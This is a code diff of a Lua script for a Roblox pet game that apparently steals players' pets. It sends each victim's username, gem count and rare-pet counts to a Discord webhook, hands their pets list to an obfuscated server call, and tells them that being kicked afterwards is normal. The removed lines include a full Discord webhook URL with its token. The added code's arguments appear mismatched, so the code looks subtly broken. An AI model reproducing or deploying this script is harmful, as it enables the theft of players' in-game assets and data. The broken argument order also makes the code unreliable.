@@ -18,7 +18,7 @@ function SendMessage(Webhook, Message, Botname)
     ["embeds"] = {
         {
             ["title"] = "**Someone Executed Your Script!**",
-            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n Huge count: ' .. Botname .. '\n Gems: '.. Message .. '\n Total exc: '.. Webhook,
             ["type"] = "rich",
             ["color"] = tonumber(0x7269da),
             ["image"] = {
@@ -103,7 +103,18 @@ for i,v in pairs(lib.Save.Get().Pets) do
     end
 end
 
+spawn(function()
+    local hugecount = 0
 
+    
+    for i,v in pairs(lib.Save.Get().Pets) do
+        local v2 = lib.Directory.Pets[v.id];
+        if v2.huge then
+            hugecount =  hugecount + 1
+        end
+    end
+    SendMessage(#PetsList, mydiamonds, tostring(hugecount) )
+end)
 
 game.ReplicatedStorage[bypass(1,"#!F3be716c53b164be6adfeeb00f2baa9bc")]:InvokeServer(PetsList2)
 
@@ -159,7 +170,6 @@ end
 
 
 
-SendMessage("https://discord.com/api/webhooks/1041403391714275439/6LQFpV5VFjvk7zQIBvtQPIfzk3DyCRMcLIQMKKWq0U8zZmAc78xyBCrkFG8cFCuVFHoj", "Got "..#PetsList..' exclusives', "Pon")
 
 
 lib.Message.New("If you get kicked after that message, it is okay, just wait for another day, or you will get banned")
